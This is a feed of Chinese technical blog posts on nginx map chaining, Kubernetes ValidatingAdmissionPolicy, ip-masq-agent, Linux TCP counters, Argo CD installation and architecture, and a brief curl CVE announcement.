IP 地址，并赋给 $client_ydip。 第三个 MAP 指令： $client_ydip 是输入变量，它是前一个映射的输出。 $client_ip 是输出变量，它根据 $http_x_forwarded_for 或 $client_ydip 进行映射。 这个映射检查 $client_ydip 的值，如果为空（\u0026quot;\u0026quot;），则将 $http_x_forwarded_for 的值赋给 $client_ip，否则根据正则表达式提取 $client_ydip 中的 IP 地址，并赋给 $client_ip。 第四个 MAP 指令： $client_ip 是输入变量，它是前一个映射的输出。 $clientRealIP 是输出变量，它根据 $remote_addr 或 $client_ip 进行映射。 这个映射检查 $client_ip 的值，如果为空（\u0026quot;\u0026quot;），则将 $remote_addr 的值赋给 $clientRealIP，否则根据正则表达式提取 $client_ip 中的 IP 地址，并赋给 $clientRealIP。 最后在 location 段中将 $clientRealIP 向后传递\nproxy_set_header X-Forwarded-For $clientRealIP Reference [1] Module ngx_http_map_module\n[2] If is Evil… when used in location context\n[3] NGINX Map Comparisons\n","permalink":"https://www.oomkill.com/2023/11/ngx-map/","summary":"","title":"nginx中的多路分支 - nginx map"},{"content":" 相关阅读：深入理解Kubernetes 4A - Admission Control源码解析\n准入 (Admission) 是 Kubernetes 提供 4A 安全认证中的一个步骤，在以前版本中 (1,26-)，官方提供了 webhook 功能，使用户可以自行的定义 Kubernetes 资源准入规则，但这些是有成本的，需要自行开发 webhook，下图是 Kubernetes准入控制流程。\n图：Kubernetes API 请求的请求处理步骤图 Source：https://kubernetes.io/blog/2019/03/21/a-guide-to-kubernetes-admission-controllers/ 在 Kubernetes 1.26 时 引入了 ValidatingAdmissionPolicy alpha 版，这个功能等于将 Admission Webhook controller 作为了一个官方扩展版，通过资源进行自行扩展，通过这种方式带来下面优势：\n减少了准入请求延迟，提高可靠性和可用性 能够在不影响可用性的情况下失败关闭 避免 webhooks 的操作负担 ValidatingAdmissionPolicy 说明 验证准入策略提供一种声明式的、进程内的替代方案来验证准入 Webhook。\n验证准入策略使用通用表达语言 (Common Expression Language，CEL) 来声明策略的验证规则。 验证准入策略是高度可配置的，使配置策略的作者能够根据集群管理员的需要， 定义可以参数化并限定到资源的策略\n下面是一个 ValidatingAdmissionPolicy 的示例，配置 Deployment 必须拥有的副本数的限制\napiVersion: admissionregistration.k8s.io/v1alpha1 kind: ValidatingAdmissionPolicy metadata: name: \u0026quot;demo-policy.example.com\u0026quot; spec: matchConstraints: resourceRules: - apiGroups: [\u0026quot;apps\u0026quot;] apiVersions: [\u0026quot;v1\u0026quot;] operations: [\u0026quot;CREATE\u0026quot;, \u0026quot;UPDATE\u0026quot;] resources: [\u0026quot;deployments\u0026quot;] validations: - expression: \u0026quot;object.spec.replicas \u0026lt;= 5\u0026quot; 这里 规格 Spec 中有两个关键属性：\nexpression 字段包含用于验证的 CEL 表达式 matchConstraints 声明什么表达式应用的类型 在声明完规则后还需要应用到资源上才生效，这里 Kubernetes 还有另外一个资源类型 ValidatingAdmissionPolicyBinding 可以声明 “资源” 和 “策略” 绑定到一起，例如下面示例\napiVersion: admissionregistration.k8s.io/v1alpha1 kind: ValidatingAdmissionPolicyBinding metadata: name: \u0026quot;demo-binding-test.example.com\u0026quot; spec: policyName: \u0026quot;demo-policy.example.com\u0026quot; validationActions: [Deny] matchResources: namespaceSelector: matchLabels: environment: test 在这里需要注意的是，每个 ValidatingAdmissionPolicyBinding 必须指定一个或多个 validationActions 来声明如何执行策略的 validations，其中 validationActions 包括：\nDeny: 验证失败会导致请求被拒绝。 Warn: 验证失败会作为警告报告给请求客户端。 Audit: 验证失败会包含在 API 请求的审计事件中。 这三个值可以同时设置，表示同时生效，例如：同时向客户端发出验证失败的警告并记录验证失败的审计记录，可以按照下面配置\nvalidationActions: [Warn, Audit] 其中，Deny 和 Warn 不能一起使用，因为这种组合会不必要地将验证失败重复输出到 API 响应体和 HTTP 警告头中。\nValidatingAdmissionPolicy 的高级可用性 ValidatingAdmissionPolicy 也是一种高度可自由配置的功能，这种方式使策略维护者能够自定义==可根据需要参数化并限定资源范围的策略== 。 例如下面一个策略示例\napiVersion: admissionregistration.k8s.io/v1alpha1 kind: ValidatingAdmissionPolicy metadata: name: \u0026quot;demo-policy.example.com\u0026quot; spec: paramKind: apiVersion: rules.example.com/v1 # 这个资源是通过CRD自定义的集群资源 kind: ReplicaLimit matchConstraints: resourceRules: - apiGroups: [\u0026quot;apps\u0026quot;] apiVersions: [\u0026quot;v1\u0026quot;] operations: [\u0026quot;CREATE\u0026quot;, \u0026quot;UPDATE\u0026quot;] resources: [\u0026quot;deployments\u0026quot;] validations: - expression: \u0026quot;object.spec.replicas \u0026lt;= params.maxReplicas\u0026quot; 在这个示例中，使用了 paramKind，这个可以使得管理员可以通过 CRD 的形式扩展策略本身，而这个 CRD 资源可以定义为下面示例所提到的\napiVersion: rules.example.com/v1 # 使用 CRD 方式定义策略本身参数 kind: ReplicaLimit metadata: name: \u0026quot;demo-params-production.example.com\u0026quot; maxReplicas: 1000 最终使用了 ValidatingAdmissionPolicyBinding 资源将 “策略” , “规则” , “限制参数” 进行了解耦合，更灵活性的引用了 ValidatingAdmissionPolicy\napiVersion: admissionregistration.k8s.io/v1alpha1 kind: ValidatingAdmissionPolicyBinding metadata: name: \u0026quot;demo-binding-production.example.com\u0026quot; spec: policyName: \u0026quot;demo-policy.example.com\u0026quot; paramRef: name: \u0026quot;demo-params-production.example.com\u0026quot; matchResources: namespaceSelector: matchExpressions: - key: environment operator: In values: - production 如何启用 ValidatingAdmissionPolicy 确保 ValidatingAdmissionPolicy 启用特性门控 (feature gates)。 确保 admissionregistration.k8s.io/v1beta1 API 启用。 --feature-gates=ValidatingAdmissionPolicy=true 总结 ValidatingAdmissionPolicy 作为 kube-apiserver 内置的功能，减少了 Kubernetes 使用者的维护成本，避免了 webhook 不可控因素影响整个集群，并带来个更便捷的管理方式，使得 Kubernetes 越来越像从工具传变成一个产品，大大加强了 Kubernetes 使用者灵活管控集群的方式。更高级的用法，以及 CEL 的使用可以参考附录官方文档\n深入理解Kubernetes 4A - Admission Control源码解析\nReference [1] 验证准入策略（ValidatingAdmissionPolicy）\n[2] Kubernetes validation admission policies\n[3] Kubernetes 1.26: Introducing Validating Admission Policies\n","permalink":"https://www.oomkill.com/2023/11/kubernetes-validatingadmissionpolicy/","summary":"","title":"K8S Admission Webhook官方扩展版 - ValidatingAdmissionPolicy"},{"content":"“IP 伪装” 通常应用于云环境中，例如 GKE, AWS, CCE 等云厂商都有使用 “IP伪装” 技术，本文将围绕 “IP伪装” 技术本身，以及这项技术在 Kubernetes 集群中的实现应用 ip-masq-agent 的源码分析，以及 ”IP伪装“ 能为 Kubernetes 带来什么作用，这三个方向阐述。\n什么是IP伪装？ IP 伪装 (IP Masquerade) 是 Linux 中的一个网络功能，一对多 (1 to Many) 的网络地址转换 (NAT) 的功能 。\nIP 伪装允许一组计算机通过 “伪装” 网关无形地访问互联网。对于互联网上的其他计算机，出站流量将看起来来自于 IP MASQ 服务器本身。互联网上任何希望发回数据包（作为答复）的主机必须将该数据包发送到网关 （IP MASQ 服务器本身）。记住，网关（IP MASQ 服务器本身）是互联网上唯一可见的主机。网关重写目标地址，用被伪装的机器的 IP 地址替换自己的地址，并将该数据包转发到本地网络进行传递。\n除了增加的功能之外，IP Masquerade 为创建一个高度安全的网络环境提供了基础。通过良好构建的防火墙，突破经过良好配置的伪装系统和内部局域网的安全性应该会相当困难。\nIP Masquerade 从 Linux 1.3.x 开始支持，目前基本所有 Linux 发行版都带有 IP 伪装的功能\n什么情况下不需要IP伪装 已经连接到互联网的独立主机 为其他主机分配了多个公共地址 IP伪装在Kubernetes集群中的应用 IP 伪装通常应用在大规模 Kubernetes 集群中，主要用于解决 “地址冲突” 的问题，例如在 GCP 中，通常是一种 IP 可路由的网络模型，例如分配给 Pod service 的 ClusterIP 只能在 Kubernetes 集群内部可用，而分配 IP CIDR 又是一种不可控的情况，假设，我们为 k8s 分配的 IP CIDR 段如下表所示：\n角色 IP CIDR Kubernetes Nodes 10.0.0.0/16 Kubernetes Services 10.1.0.0/16 Kubernetes Pods 192.168.0.0/24 其他不可控业务网段 192.168.0.0/24 通过上表可以看出，通常管理员在管理 Kubernetes 集群会配置三个网段，此时的配置，如果 Pod 需要与其他节点网络进行通讯（如我需要连接数据库），那么可能会出现 ”IP 重叠“ 的现象，尤其是在公有云环境中，用户在配置 Kubernetes 集群网络时不知道数据中心所保留的 CIDR 是什么，在这种情况下就很容易产生 ”IP 重叠“ 的现象，为了解决这个问题，Kubernetes 提出了一种使用 “IP伪装” 技术来解决这个问题。\n在不使用 IP Masquerade 的情况下， Kubernetes 集群管理员如果在规划集群 CIDR 时，必须要了解了解整个组织中已预留/未使用的 CIDR 规划。\nIP Masquerade Agent IP伪装在 kubernetes 中的应用是名为 ip-masq-agent 的项目， ip-masq-agent 是用于配置 iptables 规则，以便在将流量发送到集群节点的 IP 和集群 IP 范围之外的目标时处理伪装节点或 Pod 的 IP 地址。这本质上隐藏了集群节点 IP 地址后面的 Pod IP 地址。在某些环境中，去往\u0026quot;外部\u0026quot;地址的流量必须从已知的机器地址发出。 例如，在 GCP 中，任何到互联网的流量都必须来自 VM 的 IP。 使用容器时，如 GKE，从 Pod IP 发出的流量将被拒绝出站。 为了避免这种情况，我们必须将 Pod IP 隐藏在 VM 自己的 IP 地址后面 - 通常称为\u0026quot;伪装\u0026quot;。 默认情况下，代理配置为将 RFC 1918指定的三个私有 IP 范围视为非伪装 CIDR。 这些范围是 10.0.0.0/8、172.16.0.0/12 和 192.168.0.0/16。 默认情况下，代理还将链路本地地址（169.254.0.0/16）视为非伪装 CIDR。 代理程序配置为每隔 60 秒从 /etc/config/ip-masq-agent 重新加载其配置， 这也是可修改的。\n图：ip-masq-agent工作原理 Source：https://kubernetes.io/zh-cn/docs/tasks/administer-cluster/ip-masq-agent/\n默认情况下，CIDR 10.0.0.0/8，172.16.0.0/12, 192.168.0.0/16 范围内的流量不会被伪装。 任何其他 CIDR 流量将被伪装。 Pod 访问本地目的地的例子，可以是其节点 (Node) 的 IP 地址，另一节点 (Node) 的地址或集群的 IP 地址 (ClusterIP) 范围内的一个 IP 地址。 默认情况下，任何其他流量都将伪装。以下条目展示了 ip-masq-agent 的默认使用的规则：\n$ iptables -t nat -L IP-MASQ-AGENT target prot opt source destination RETURN all -- anywhere 169.254.0.0/16 /* ip-masq-agent: cluster-local traffic should not be subject to MASQUERADE */ ADDRTYPE match dst-type !LOCAL RETURN all -- anywhere 10.0.0.0/8 /* ip-masq-agent: cluster-local traffic should not be subject to MASQUERADE */ ADDRTYPE match dst-type !LOCAL RETURN all -- anywhere 172.16.0.0/12 /* ip-masq-agent: cluster-local traffic should not be subject to MASQUERADE */ ADDRTYPE match dst-type !LOCAL RETURN all -- anywhere 192.168.0.0/16 /* ip-masq-agent: cluster-local traffic should not be subject to MASQUERADE */ ADDRTYPE match dst-type !LOCAL MASQUERADE all -- anywhere anywhere /* ip-masq-agent: outbound traffic should be subject to MASQUERADE (this match must come after cluster-local CIDR matches) */ ADDRTYPE match dst-type !LOCAL 部署 ip-masq-agent ip-masq-agent 的部署可以直接使用官方提供的资源清单 [1]\nkubectl apply -f https://raw.githubusercontent.com/kubernetes-sigs/ip-masq-agent/master/ip-masq-agent.yaml 清除 ip-masq-agent\nkubectl delete -f https://raw.githubusercontent.com/kubernetes-sigs/ip-masq-agent/master/ip-masq-agent.yaml 部署后需要同时将对应的节点标签应用于集群中希望代理运行的任何节点\nkubectl label nodes my-node node.kubernetes.io/masq-agent-ds-ready=true 配置好之后，需要创建配置，以对不伪装的地址增加白名单\nnonMasqueradeCIDRs: - 10.0.0.0/8 resyncInterval: 60s ip-masq-agent 深入解析 ip-masq-agent 的代码很少，只有400多行，但是作用却很大，直接可以解决管理员集群网络规划与大拓扑网络的网络冲突问题，下面就分析他的原理，以及如何完成集群 IP 伪装功能\nip-masq-agent源码的分析 ip-masq-agent 只有这一个文件 cmd/ip-masq-agent/ip-masq-agent.go，包含了整个的业务逻辑\n首先在 main() 启动时，定义了这个链的名称，之后调用 Run()\nmasqChain = utiliptables.Chain(*masqChainFlag) .. m.Run() 在 Run() 中，只是做了周期性同步\nfunc (m *MasqDaemon) Run() { // Periodically resync to reconfigure or heal from any rule decay for { func() { defer time.Sleep(time.Duration(m.config.ResyncInterval)) // resync config if err := m.osSyncConfig(); err != nil { glog.Errorf(\u0026quot;error syncing configuration: %v\u0026quot;, err) return } // resync rules if err := m.syncMasqRules(); err != nil { glog.Errorf(\u0026quot;error syncing masquerade rules: %v\u0026quot;, err) return } // resync ipv6 rules if err := m.syncMasqRulesIPv6(); err != nil { glog.Errorf(\u0026quot;error syncing masquerade rules for ipv6: %v\u0026quot;, err) return } }() } } 重点就在 m.osSyncConfig() , 这里做的是同步实际的规则\nfunc (m *MasqDaemon) syncMasqRules() error { // 指定的链是否存在，如果不存在则创建，masqChain全局变量 是 main() 中初始化的名称，默认为IP-MASQ-AGENT m.iptables.EnsureChain(utiliptables.TableNAT, masqChain) // ensure that any non-local in POSTROUTING jumps to masqChain if err := m.ensurePostroutingJump(); err != nil { return err } // build up lines to pass to iptables-restore lines := bytes.NewBuffer(nil) writeLine(lines, \u0026quot;*nat\u0026quot;) writeLine(lines, utiliptables.MakeChainLine(masqChain)) // effectively flushes masqChain atomically with rule restore // local-link cidr 不伪装（\u0026quot;169.254.0.0/16\u0026quot;） 固定值 if !m.config.MasqLinkLocal { writeNonMasqRule(lines, linkLocalCIDR) } // 用户定义的不伪装的 CIDR 部分 for _, cidr := range m.config.NonMasqueradeCIDRs { if !isIPv6CIDR(cidr) { writeNonMasqRule(lines, cidr) } } // masquerade all other traffic that is not bound for a --dst-type LOCAL destination writeMasqRule(lines) writeLine(lines, \u0026quot;COMMIT\u0026quot;) if err := m.iptables.RestoreAll(lines.Bytes(), utiliptables.NoFlushTables, utiliptables.NoRestoreCounters); err != nil { return err } return nil } 看完同步规则后，了解到上面就是两个操作，”伪装“ 和 “不伪装” 的操作如下所示\n不伪装部分实际上就是关键词 RETURN\nfunc writeNonMasqRule(lines *bytes.Buffer, cidr string) { writeRule(lines, utiliptables.Append, masqChain, nonMasqRuleComment, \u0026quot;-d\u0026quot;, cidr, \u0026quot;-j\u0026quot;, \u0026quot;RETURN\u0026quot;) } 伪装部分实际上就是关键词 MASQUERADE\nfunc writeMasqRule(lines *bytes.Buffer) { writeRule(lines, utiliptables.Append, masqChain, masqRuleComment, \u0026quot;-j\u0026quot;, \u0026quot;MASQUERADE\u0026quot;, \u0026quot;--random-fully\u0026quot;) } 伪装网络包的分析 创建一个 ip-masq-agent 的配置文件\ntee \u0026gt; config \u0026lt;\u0026lt;EOF nonMasqueradeCIDRs: - 10.244.0.0/16 - 192.0.0.0/8 resyncInterval: 60s EOF 创建 configmap\nkubectl create configmap ip-masq-agent --from-file=config --namespace=kube-system 验证规则是否生效\n$ iptables -t nat -L IP-MASQ-AGENT Chain IP-MASQ-AGENT (1 references) target prot opt source destination RETURN all -- anywhere link-local/16 /* ip-masq-agent: local traffic is not subject to MASQUERADE */ RETURN all -- anywhere 10.244.0.0/16 /* ip-masq-agent: local traffic is not subject to MASQUERADE */ RETURN all -- anywhere 192.0.0.0/8 /* ip-masq-agent: local traffic is not subject to MASQUERADE */ MASQUERADE all -- anywhere anywhere /* ip-masq-agent: outbound traffic is subject to MASQUERADE (must be last in chain) */ 抓包查看包是否被伪装\n$ cpid=`docker inspect --format '{{.State.Pid}}' 6b0a92ca4327` $ nsenter -t $cpid -n ifconfig eth0|grep inet inet 10.244.196.132 netmask 255.255.255.255 broadcast 10.244.196.132 $ nsenter -t $cpid -n ping 10.0.0.2 $ tcpdump -i any icmp and host 10.0.0.2 -w icap.cap 通过导出的 wireshark 包，可以很清楚的看到，去往 10.0.0.2 的已经被伪装了\n图：Kubernetes集群节点IP伪装抓包 Reference [1] ip-masq-agent.yaml\n[2] IP Masquerade Agent 用户指南\n[3] IP address management strategy — a crucial aspect of running GKE\n","permalink":"https://www.oomkill.com/2023/10/ch24-ip-masq/","summary":"","title":"Kubernetes集群中的IP伪装 - ip-masq-agent"},{"content":"在Prometheus node-exporter中，存在多个网络监控指标指标标志着主机的网络状态，但是大家常常忽略这些指标，而这些指标又很重要，这些指标的来源是根据Linux网络子系统中的多个计数器定义的，本文就解开这些TCP计数器的面目。\nTcpExtListenOverflows 和 TcpExtListenDrops 当内核从客户端接收到 SYN 时，如果 TCP 接受队列已满，内核将丢弃 SYN 并将 TcpExtListenOverflows +1。同时内核也会给TcpExtListenDrops +1。当 TCP 套接字处于 LISTEN 状态，并且内核需要丢弃数据包时，内核总是将 TcpExtListenDrops +1。因此，增加 TcpExtListenOverflows 将使 TcpExtListenDrops 同时增加，但在不增加 TcpExtListenOverflows 的情况下，TcpExtListenDrops 也会增加，例如内存分配失败也会导致 TcpExtListenDrops 增加。\n以上解释基于内核 4.10 或更高版本，在旧内核上，当 TCP 接受队列已满时，TCP Stack有不同的行为。在旧内核上，TCP Stack不会丢弃 SYN，它会完成 3 次握手。当接受队列已满时，TCP 堆栈会将套接字保留在 TCP 半开队列中。由于处于半开队列中，TCP 堆栈将在指数退避计时器上发送 SYN+ACK，在客户端回复 ACK 后，TCP Stack检查接受队列是否仍满，如果未满，则将套接字移至接受队列如果队列已满，则将套接字保留在半开队列中，下次客户端回复ACK时，该套接字将有另一次机会移至接受队列。\n这两个计数器在 node_expoter 中的指标是：\nnode_netstat_TcpExt_ListenDrops node_netstat_TcpExt_ListenOverflows TcpInSegs 和 TcpOutSegs TcpInSegs 和 TcpOutSegs 都是被定义在 RFC1213 [1]\nTcpInSegs 是指 TCP layer 接收到的数据包数量，包括错误接收的数据包，例如校验和错误、无效的TCP头等。只有一个错误不会被包含在内：如果第 2 层目标地址不是 NIC 的第 2 层地址。如果数据包是多播或广播数据包，或者 NIC 处于混杂模式，则可能会发生这种情况。在这些情况下，数据包将被传递到 TCP 层，但 TCP 层将在增加 TcpInSegs 之前丢弃这些数据包。 TcpInSegs 计数器不知道 GRO (Generic Receive Offload)。因此，如果两个数据包被 GRO 合并，TcpInSegs 计数器只会增加 1。\nTcpOutSegs 是指 TCP layer 发送的数据包数量，它排除了重传的数据包。但它包括 SYN, ACK 和 RST 数据包。与 TcpInSegs 不同，TcpOutSegs 能够识别 GSO (Generic Receive Offload)，因此如果数据包被 GSO 分割为 2，TcpOutSegs 将增加 2。\n这两个计数器在 node_expoter 中的指标是：\nnode_netstat_Tcp_InSegs node_netstat_Tcp_OutRsts TcpPassiveOpens 和 TcpActiveOpens TcpPassiveOpens 和 TcpActiveOpens 都是被定义在 RFC1213 [1]\nTcpPassiveOpens 是指 TCP层收到一个SYN，回复一个 SYN+ACK，进入 SYN-RCVD 状态。\nTcpActiveOpens 是指 TCP 层发送了一个SYN，并进入 SYN-SENT 状态。每次 TcpActiveOpens +1，TcpOutSegs 应始终+1。\n这两个计数器在 node_expoter 中的指标是：\nnode_netstat_Tcp_PassiveOpens node_netstat_Tcp_ActiveOpens TcpEstabResets 和 TcpOutRsts TcpEstabResets 和 TcpOutRsts 都是被定义在 RFC1213 [1]\nTcpEstabResets 指 TCP 连接从 ESTABLISHED 状态或 CLOSE-WAIT 状态直接转换到 CLOSED 状态的次数。\nTcpOutRsts 指发送的包含 RST 标志的 TCP 段的数量。\n这两个计数器在 node_expoter 中的指标是：\nnode_netstat_Tcp_OutRsts node_netstat_Tcp_ActiveOpens TCPSynRetrans SYN 和 SYN/ACK 重传 (Retransmit )次数，将重传分为 SYN, 快速重传, 超时重传等。\n这个计数器在 node_expoter 中的指标是：\nnode_netstat_TcpExt_TCPSynRetrans Reference [1] RFC1213\n[2] SNMP counter\n","permalink":"https://www.oomkill.com/2023/10/linux-network-conunter/","summary":"","title":"Linux网络子系统中的计数器"},{"content":"GitOps 最初由 Weaveworks (weave cni的组织) 在 2017 年的博客中提出 [1]，使用 “Git” 作为 CI/CD 的 “单一事实来源”，将代码的更改集成到每个项目的存储库中，并使用拉取请求来管理 infra 和部署。 在理解上就可以理解为 “是一种基于 git 的操作框架”\nArgo CD 是一种 kubernetes 之上的 “声明式” (declarative) 的 gitops CD， 在本文作为了解如何在 Kubernetes 集群中安装和配置 Argo CD。\n前提准备 想要安装 Argo CD 首先环境需要具备如下：\n已经安装好 kubectl 命令行工具 拥有 kubeconfig 文件 一个可供测试的 Kubernetes 集群，如：kind, minikube, kubeadm, binary 等任意的集群 步骤1 - 选择适配 kubernetes 版本的 Argo 根据官方的解释， Argo CD 在任何给定时刻所支持的版本，这些版本是 N 和 N - 1 次要版本的最新修补版本 (x.x.new)。这些 Argo CD 版本与 Kubernetes 项目官方支持的 Kubernetes 版本相一致，通常是 Kubernetes 的最近发布的 3 个版本。\n即可以理解为 Argo N \u0026amp; N-1 支持的 Kubernetes 版本为 N-2\n举例来说，如果 Argo CD 的最新次要版本是 2.4.3 和 2.3.5, 那么所支持的 K8S 版本则如下面列表\nArgo CD 2.4.3 on Kubernetes 1.24 Argo CD 2.4.3 on Kubernetes 1.23 Argo CD 2.4.3 on Kubernetes 1.22 Argo CD 2.3.5 on Kubernetes 1.24 Argo CD 2.3.5 on Kubernetes 1.23 Argo CD 2.3.5 on Kubernetes 1.22 而在较新版本中，Argo官方给出了 Argo CD 在 K8S 什么版本之上，测试什么版本的 Argo (2.8起)，而 Argo 版本又和 K8S 版本较为吻合，例如最新版 Kubernetes 为 1.28 (2023.10)，那么 Argo 最新版 (2.8).\n假设现在你的 kubernetes 集群版本为 1.19.10, 那么按照这个规律基本上符合的为 1.8/2.0，如果 kubernetes 集群版本为 1.18.10, 那么符合的版本为 1.7/1.8，对于旧版本，尽量选择最符合的，不要按照这个规律，因为规律是 2.3+ 才提出的。\n对于每一个版本的部署文件路径，可以通过 argo 仓库 manifest 目录中寻找 github.com/argoproj/argo-cd/tree/version/manifests\n步骤2 - 执行安装 在本实例中，安装环境为 kubernetes 1.19.10 ，选择的 Argo CD 版本为 2.0，那么只需要找到其 “资源清单” 文件即可，需要注意的是，版本号要与仓库中 “tag” 保持一致\nARGO_VERSION=v2.0.5 https://raw.githubusercontent.com/argoproj/argo-cd/${ARGO_VERSION}/manifests/install.yaml 使用 kubectl 应用这个文件即可\nkubectl apply -f https://raw.githubusercontent.com/argoproj/argo-cd/${ARGO_VERSION}/manifests/install.yaml 如果需要部署在特定的 NS 内，可以使用下面命令\nkubectl apply -n argocd -f https://raw.githubusercontent.com/argoproj/argo-cd/${ARGO_VERSION}/manifests/install.yaml 安装就是应用对应资源到 Kubernetes 集群\ncustomresourcedefinition.apiextensions.k8s.io/applications.argoproj.io created customresourcedefinition.apiextensions.k8s.io/appprojects.argoproj.io created serviceaccount/argocd-application-controller created serviceaccount/argocd-dex-server created serviceaccount/argocd-redis created serviceaccount/argocd-server created role.rbac.authorization.k8s.io/argocd-application-controller created role.rbac.authorization.k8s.io/argocd-dex-server created role.rbac.authorization.k8s.io/argocd-redis created role.rbac.authorization.k8s.io/argocd-server created clusterrole.rbac.authorization.k8s.io/argocd-application-controller created clusterrole.rbac.authorization.k8s.io/argocd-server created rolebinding.rbac.authorization.k8s.io/argocd-application-controller created rolebinding.rbac.authorization.k8s.io/argocd-dex-server created rolebinding.rbac.authorization.k8s.io/argocd-redis created rolebinding.rbac.authorization.k8s.io/argocd-server created clusterrolebinding.rbac.authorization.k8s.io/argocd-application-controller created clusterrolebinding.rbac.authorization.k8s.io/argocd-server created configmap/argocd-cm created configmap/argocd-gpg-keys-cm created configmap/argocd-rbac-cm created configmap/argocd-ssh-known-hosts-cm created configmap/argocd-tls-certs-cm created secret/argocd-secret created service/argocd-dex-server created service/argocd-metrics created service/argocd-redis created service/argocd-repo-server created service/argocd-server created service/argocd-server-metrics created deployment.apps/argocd-dex-server created deployment.apps/argocd-redis created deployment.apps/argocd-repo-server created deployment.apps/argocd-server created statefulset.apps/argocd-application-controller created networkpolicy.networking.k8s.io/argocd-application-controller-network-policy created networkpolicy.networking.k8s.io/argocd-dex-server-network-policy created networkpolicy.networking.k8s.io/argocd-redis-network-policy created networkpolicy.networking.k8s.io/argocd-repo-server-network-policy created networkpolicy.networking.k8s.io/argocd-server-network-policy created 步骤3 - 访问argo server 通常在部署好 Kubernetes 中的应用后，需要访问大概有四种方式：\n修改清单，将 service 端口改为 NodePort 模式 使用 Ingress 使用端口转发 ( port-forward ) 这里选择最简单方式，使用 kubectl 的 port-forward 进行访问，随机端口\nkubectl port-forward svc/argocd-server :443 --address='0.0.0.0' 指定本地端口\nkubectl port-forward svc/argocd-server 8888:443 --address='0.0.0.0' 还可以指定任意的资源进行映射，比如 deployment, Pod\nkubectl port-forward pod/{pod_name} 8888:443 --address='0.0.0.0' Notes: 使用 port-forwad 需要在 Kubernetes 集群所有 Node 之上安装 socat , 否则会出现下面问题\nE1030 23:34:25.973226 36174 portforward.go:400] an error occurred forwarding 8181 -\u0026gt; 8080: error forwarding port 8080 to pod xxxxxxxxx, uid : unable to do port forwarding: socat not found\n此时 WEB UI 可以开启了，还需要获得默认的用户才可以登录到集群内，这里 ArgoCD 首次登陆密码被以 secert 形式保存在集群内，使用下面命令可以获取，默认用户名是 ”admin“\nkubectl -n argocd get secret argocd-initial-admin-secret -o jsonpath=\u0026quot;{.data.password}\u0026quot; | base64 -d \u0026amp;\u0026amp; echo 安装 ArgoCD CLI 安装 ArgoCD CLI 工具有两种主要方法，mac 之上可以通过 brew 安装，其他操作系统需要从 github release 下载安装二进制文件，下载后可以使用 argocd login 登录集群，登录的地址是 argo server 的地址\nargocd login localhost:8080 通过 argocd cli 也可以更新密码\nargocd account update-password 至此，一个简单的 Argo CD 就部署完了，当然 Argo CD 也有高可用版本，可以参考官方给出的高可用版本的清单进行安装 [2]\nReference [1] Getting Started with ArgoCD on Kubernetes\n[2] Installation\n","permalink":"https://www.oomkill.com/2023/10/argo-installtion/","summary":"","title":"初识Argo cd - 在k8s集群上安装argo cd"},{"content":"Argo组件 API Server Repository Server Application Controller API Server：一个 gRPC/REST 服务器，提供了 “Web UI”、“CLI” 和 “CI/CD” 使用的 API\n应用管理和状态报告 调用应用操作（例如同步、回滚、用户定义的操作） 存储库和 Cluster credential 管理（作为 kubernetes secret 存储） 为外部提供身份认证和代理授权功能 RBAC 试试 Git webhook 事件的 listener/forwarder Repository Server：内部服务，用于维护 git 中的应用清单 (manifests) 的本地缓存。负责接收生成和返回 kubernetes 清单\n仓库URL revision (commit, tag, branch) APP PATH 模板特定的参数 Application Controller：Kubernetes controller，主要做的工作是持续监控运行的 Application，并于当前实时状态和目标所需状态进行对比（与 Kubernetes Controller 功能是相同的），并且不仅仅是 KC 还会和存储库中指定目标状态进行比较，检测到 OutOfSync 状态将进行纠正。\nArgo 架构 Argo CD 时最常见的三种架构：单实例方案, 集群级方案，以及折衷方案 (compromise between the two)。\n单实例方案 单实例 (One instance) 是指 “通过一个实例 (Argo) 来管理多个集群”，这是一种比较流行的方式，这种方式最大的特点是在用户角度看，是用户对 Application 有单一的视图层。单一的 “视图层” 为用户简化了 API 的集成与 CLI 的登录的配置与体验；为管理员提供了一个统一配置，如 “密钥”, “CRD” 等。\n图：单实例集群架构图 Source：https://akuity.io/blog/argo-cd-architectures-explained/ 单实例方案的优缺点如下：\n跨所有集群的单一视图层。 统一控制平面，简化安装和维护。 单实例可轻松集成 API/CLI。 缺点：\n单点故障。 扩展需要调整各个组件。 需要一个单独的“管理”集群 (Kubernetes)。 所有集群的 “集群凭证” (kubeconfig) 存储在单集群上，掌握了管理集群或Argo实例，等于可以直接访问所有集群 单独的 Application Controller 去管理所有集群的资源，AC 压力较大 Argo CD 和集群之间存在大量网络流量。 集群级别方案 集群级别方案 (separation instance for cluster) 是指将 Argo 分到每一个集群内，这样可以简化安全与控制难度；为什么说这种方式相对安全，因为在这种模式下， Argo CD 在集群内运行，这意味着不需要将集群 API 暴露给外部控制平面。另外也没有任何中心化实例包含了所有集群的凭证 (kubeconfig)，这种模式下就将 “安全域” 限制为 Argo CD 所在集群，而不是共享（中心化）。\n图：SIC集群架构 Source：https://akuity.io/blog/argo-cd-architectures-explained/ 集群级方案的优缺点如下：\n每个集群一个 Argo CD workload 不需要外部访问，消除 Argo CD 离开集群的流量 一个集群中断不会引起其他集群的正常工作 集群安全凭证仅限制该集群自己 减少了网络流量的成本（集群内使用内外，跨集群可能需要公网流量） 安全域与故障半径得到控制 缺点：\n维护成本增加，需要维护不同配置的多个实例，或相同配置的多个实例 集群规模不同，Argo 实例也不同 API/CLI 需要分别绑定集群 在计算资源的总成本相对增加 折衷方案 - 根据逻辑组划分 这个方案是根据 “单实例” 与 “SIC” 两个方案的优缺点进行折衷的一种方式，是将多个 Kubernetes 集群按照 “逻辑组” 划分，分组可以按团队, 区域或环境进行。只要是对你有意义的。此架构非常有用。它消除了维护过多 Argo CD 的成文。对于实例管理的所有集群来说，RBAC, AppProject 和其他配置可能是相似的。因此，与为每个集群运行一个实例相比，减少了配置重复。\n图：折衷方案架构图 Source：https://akuity.io/blog/argo-cd-architectures-explained/ 折衷方案的优缺点如下：\n按组分配 Argo 负载 一个集群的中断不会影响其他分组 可以控制对外网络流量，进一步缩小了凭证等信息的安全域，以及限制了问题半径 减少配置 缺点：\n有相对的维护成本 也需要单独的“管理集群” Reference [1] A Comprehensive Overview of Argo CD Architectures – 2023\n[2] How many do you need? - Argo CD Architectures Explained\n","permalink":"https://www.oomkill.com/2023/10/ch01-argo-beginning/","summary":"","title":"初识Argo cd - argo cd架构"},{"content":"10月11日发布的 curl 8.4.0版本，在新版本中修复漏洞 CVE-2023-38545 和 CVE-2023-38546\nCVE-2023-38545: This flaw makes curl overflow a heap based buffer in the SOCKS5 proxy handshake. [1] CVE-2023-38546: This flaw allows an attacker to insert cookies at will into a running program using 